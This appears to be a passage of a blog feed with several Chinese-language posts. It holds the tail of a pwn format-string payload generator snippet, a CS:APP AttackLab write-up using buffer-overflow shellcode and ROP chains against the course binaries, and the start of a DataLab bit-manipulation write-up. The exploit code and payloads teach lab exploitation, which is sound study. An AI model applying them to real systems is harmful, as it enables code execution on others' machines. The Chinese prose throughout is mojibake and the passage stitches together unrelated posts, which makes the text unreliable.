&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 4:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 5:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low5 = (after_change &amp; 0xff00000000) &gt;&gt; 32&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c5 = (low5 - low4 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg5 = location_arg4 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c5) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg5) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x4)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 6:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low5 = (after_change &amp; 0xff00000000) &gt;&gt; 32&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low6 = (after_change &amp; 0xff0000000000) &gt;&gt; 40&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c5 = (low5 - low4 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c6 = (low6 - low5 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg5 = location_arg4 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg6 = location_arg5 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c5) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg5) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c6) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg6) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x4)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x5)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    return payload&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://lingze.xyz/book/pwn/env/">https://lingze.xyz/book/pwn/env/</a></li><li><a href="https://blog.sigmerc.top/post/PwnTemplate/">https://blog.sigmerc.top/post/PwnTemplate/</a></li><li><a href="https://code.visualstudio.com/docs/editor/userdefinedsnippets">https://code.visualstudio.com/docs/editor/userdefinedsnippets</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AttackLab</title>
      <link href="2021/07/18/AttackLab/"/>
      <url>2021/07/18/AttackLab/</url>
      
        <content type="html"><![CDATA[<h1 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h1><h2 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h2><p><img src="https://i.loli.net/2021/07/18/eP4hAwgymJpYRLi.png" alt=""></p><p>ç»“åˆæ±‡ç¼–ä»£ç å¯ä»¥ç¡®å®šè¿”å›åœ°å€è·ç¦»æˆ‘ä»¬è¾“å…¥çš„bufè·ç¦»ä¸º0x28ï¼ŒæŸ¥çœ‹Getså‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">Gets</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  gets_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = _IO_getc(infile);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> || v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *i = v2;</span><br><span class="line">    save_char(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  save_term();</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¾“å…¥ä»»æ„æ•°é‡çš„å­—ç¬¦</p><p>é‚£å°±å¥½åŠäº†ï¼Œæˆ‘ä»¬ä½¿ç”¨é™„ä»¶é‡Œçš„hex2rawæ–‡ä»¶æ„é€ è¾“å…¥ï¼Œå†ç”¨ç®¡é“ç¬¦è¾“å…¥åˆ°æ–‡ä»¶ä¸­å³å¯</p><p>payloadå’Œattackæ•ˆæœå¦‚ä¸‹:</p><p><img src="https://i.loli.net/2021/07/18/8xLTPegmUZyAs3i.png" alt=""></p><h2 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h2><p>ä¸çœ‹IDAåæ±‡ç¼–å‡ºæ¥çš„ä¼ªä»£ç äº†ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ¬ºè´Ÿäºº2333ï¼Œç›´æ¥objdumpå¥½äº†</p><p>ä»ç½‘ä¸Šæ•´äº†ä¸ªnmé…åˆobjdumpæ¥åæ±‡ç¼–æŒ‡å®šå‡½æ•°çš„jioæœ¬</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">vmlinux=<span class="variable">$1</span> </span><br><span class="line">symbol=<span class="variable">$2</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$vmlinux</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;usage : <span class="variable">$0</span> vmlinux symbol&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"> </span><br><span class="line">startaddress=$(nm -n <span class="variable">$vmlinux</span> | grep <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">endaddress=$(nm -n <span class="variable">$vmlinux</span> | grep -A1 <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;getline; print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$symbol</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;dump all symbol&quot;</span></span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;start-address: <span class="variable">$startaddress</span>, end-address: <span class="variable">$endaddress</span>&quot;</span> </span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> --start-address=<span class="variable">$startaddress</span> --stop-address=<span class="variable">$endaddress</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è¿›touch2å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-address: 0x00000000004017ec, end-address: 0x000000000040184c</span><br><span class="line"></span><br><span class="line">ctarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017f0:89 fa                mov    %edi,%edx</span><br><span class="line">  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:00 00 00 </span><br><span class="line">  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:75 20                jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:be e8 30 40 00       mov    $0x4030e8,%esi</span><br><span class="line">  401809:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40180e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:be 10 31 40 00       mov    $0x403110,%esi</span><br><span class="line">  401829:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40182e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸¤ä¸ªprintfçš„å‚æ•°ï¼Œåˆ†åˆ«è¾“å‡ºå¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/07/18/iLu5wCNo9Dnk4fZ.png" alt=""></p><p>é‚£ä¹ˆå³æˆ‘ä»¬å¾—è®©ä¼ å…¥çš„å‚æ•°å’Œcookieç›¸ç­‰ï¼Œå†è·³è½¬åˆ°touch2</p><p><img src="https://i.loli.net/2021/07/18/7yZxrT24QwUn8K9.png" alt=""></p><p>ç»è¿‡è°ƒè¯•å‘ç°æˆ‘ä»¬rspçš„åœ°å€æ˜¯mmapå‡ºæ¥çš„ä¸€å—å…·æœ‰RWXæƒé™çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸‹å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥èƒ½å¤Ÿæ‰§è¡Œä»£ç äº†å±äºæ˜¯ï¼Œé‚£ğŸ‘´ğŸ»ç›´æ¥å†™æ±‡ç¼–è¿›å»ï¼Œå†åšä¸€æ¬¡ret</p><p>ä½¿ç”¨pwntoolsçš„å‘½ä»¤è¡Œå·¥å…·æ¥ç”Ÿæˆæ±‡ç¼–ä»£ç çš„äºŒè¿›åˆ¶å½¢å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x59b997fa; ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7fa97b959c3</span><br></pre></td></tr></table></figure><p>éªŒè¯ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn disasm 48c7c7fa97b959c3 -c amd64</span><br><span class="line">   0:    48 c7 c7 fa 97 b9 59     mov    rdi,  0x59b997fa</span><br><span class="line">   7:    c3                       ret</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/63tK5rOUPTQs9uC.png" alt=""></p><p>è¿™ã€‚ã€‚ã€‚åº”è¯¥æ˜¯æˆåŠŸäº†å§ï¼Œæ¯•ç«Ÿæ²¡æœ‰Misfileï¼Œä¸çŸ¥é“ä¸‹é¢çš„FAILå•¥æ„æ€</p><h2 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h2><p>idaåç¼–è¯‘å‡ºæ¥çš„hexmatchå‡½æ•°æ˜¯ä»€ä¹ˆç©æ„ï¼Œçœ‹çš„ä¸€å¤´é›¾æ°´ï¼Œå‚è€ƒäº†ä¸€ä¸‹wpï¼Œå‘ç°ä¸åŒå¤§ä½¬çš„wpä¸­éƒ½ç›´æ¥æœ‰æºç ï¼ˆä»å“ªæçš„ã€‚ã€‚ï¼‰</p><p><img src="https://i.loli.net/2021/07/18/btuhGr1vaXEzqsQ.png" alt=""></p><p>é‚£å°±æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒå‘—ï¼Œä¼ ä¸ªåœ°å€è¿›å…¥ï¼Œè¿™ä¸ªåœ°å€éœ€è¦æŒ‡å‘cookie</p><p>å°±å¤šç»•äº†ä¸ªå¼¯ï¼Œå’Œtouch2å·®ä¸å¤š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x5561dcb0;push 0x4018fa;ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7b0dc615568fa184000c3</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/HczPui42NJO63jB.png" alt=""></p><h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>ropç³»åˆ—æ ˆæ— æ³•æ‰§è¡Œï¼Œé‚£ä¹ˆå°±ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„ropæ¥æ</p><p>é¦–å…ˆæ˜¯touch2ï¼ˆtouch1è·Ÿä¹‹å‰é‚£ä¸ªæ²¡å•¥ä¸ä¸€æ ·çš„ï¼‰</p><p>ç›´æ¥ROPgadgetä¸€æŠŠæ¢­</p><p><img src="https://i.loli.net/2021/07/18/LHjT5YSAfP6hsla.png" alt=""></p><p>payloadå°±æ˜¯<code>pop_rdi_ret + cookie + touch2_address</code></p><p><img src="https://i.loli.net/2021/07/18/9djsK5fhUkGD8JS.png" alt=""></p><h2 id="rop3"><a href="#rop3" class="headerlink" title="rop3"></a>rop3</h2><p>å¡ä½äº†ï¼Œç®—åç§»çš„æ—¶å€™ç®—é”™äº†QAQï¼Œå¤§ä½“æ€è·¯é‡‡ç”¨ä¸€ä¸ªå¤§ä½¬çš„å›¾ç‰‡</p><p><img src="https://i.loli.net/2021/07/18/RlG8pJHzBh1N72C.png" alt=""></p><p>å…¶ä¸­add_xyæ˜¯farmé‡Œè‡ªå¸¦çš„å‡½æ•°ï¼Œåœ¨rtargetä¸­å«æœ‰</p><p><img src="https://i.loli.net/2021/07/18/hHrwgfzcTMeoy6O.png" alt=""></p><h1 id="æ€»ç»“åé¦ˆ"><a href="#æ€»ç»“åé¦ˆ" class="headerlink" title="æ€»ç»“åé¦ˆ"></a>æ€»ç»“åé¦ˆ</h1><ol><li>gdbè°ƒè¯•å¸¦å‚æ•°æ–‡ä»¶ï¼Œset args -qï¼Œå…¶ä¸­â€-qâ€ä¸ºå‚æ•°</li><li>objdump é…åˆ nm åæ±‡ç¼–å‡ºæŸä¸ªæŒ‡å®šå‡½æ•°</li><li>pwn asm å‘½ä»¤è¡Œå·¥å…·ç”ŸæˆäºŒè¿›åˆ¶æ±‡ç¼–æ•°æ®ï¼Œå…¶ä¸­-cæŒ‡å®šå½¢å¼ï¼Œé»˜è®¤linux/i386</li><li>äºŒè¿›åˆ¶æ•°æ®å¯ä»¥ç”¨ç®¡é“ç¬¦æ¥è¾“å…¥åˆ°æ–‡ä»¶</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DataLab</title>
      <link href="2021/07/10/DataLab/"/>
      <url>2021/07/10/DataLab/</url>
      
        <content type="html"><![CDATA[<h1 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p>æ€è·¯æ¯”è¾ƒç®€å•ï¼Œå³ä½¿ç”¨~å’Œ&amp;å®ç°å¼‚æˆ–<br>å¼‚æˆ–å³ç›¸åŒä¸º0ä¸åŒä¸º1<br>Y = ~AB + ~BAå³å¯å®ç°<br>ç„¶åæŠŠæˆ–é€šè¿‡å¾·æ‘©æ ¹å¾‹å˜æˆä¸å³å¯å®ç°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>è¡¥ç çš„æœ€å°äºŒè¿›åˆ¶æ•°å°±æ˜¯æœ€é«˜ä½1å…¶ä½™ä¸º0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><p>å› ä¸ºè¿”å›å€¼åªæœ‰0å’Œ1ï¼Œæ‰€ä»¥è€ƒè™‘æœ€åè‚¯å®šæ˜¯ä½¿ç”¨!è¿ç®—ç¬¦æ¥å®ç°<br>ç„¶åè€ƒè™‘æœ€å¤§æ•°ç‹¬æœ‰çš„ç‰¹ç‚¹ï¼Œå³0x7fffffff + 1 = 0x80000000 = -2147483648<br>æ‰€ä»¥ 0x80000000 + 0x7fffffff = -1<br>æ‰€ä»¥ 0x80000000 + 0x7fffffff + 1 = -1 + 1 = 0<br>æ‰€ä»¥ !(0x80000000 + 0x7fffffff + 1) = !(-1 + 1) = 1<br>ç»¼ä¸Šå³ !((x + 1) + x + 1)<br>è¿™ä¸ªå¼å­çœ‹ç€å°±å¾ˆè¯¡å¼‚ï¼Œåªæœ‰è¾¹ç•Œå€¼æ‰æ»¡è¶³ï¼Œä½†æ˜¯å°‘è€ƒè™‘äº†æœ€å°è¾¹ç•Œå€¼0å’Œ-1çš„æƒ…å†µï¼ˆå‡ºé”™åæ‰æ„è¯†åˆ°ï¼‰ï¼Œæ‰€ä»¥åŠ ä¸ªå’Œ0x7fffffffç›¸ä¸çš„æ“ä½œå³å¯é¿å…0xffffffffçš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 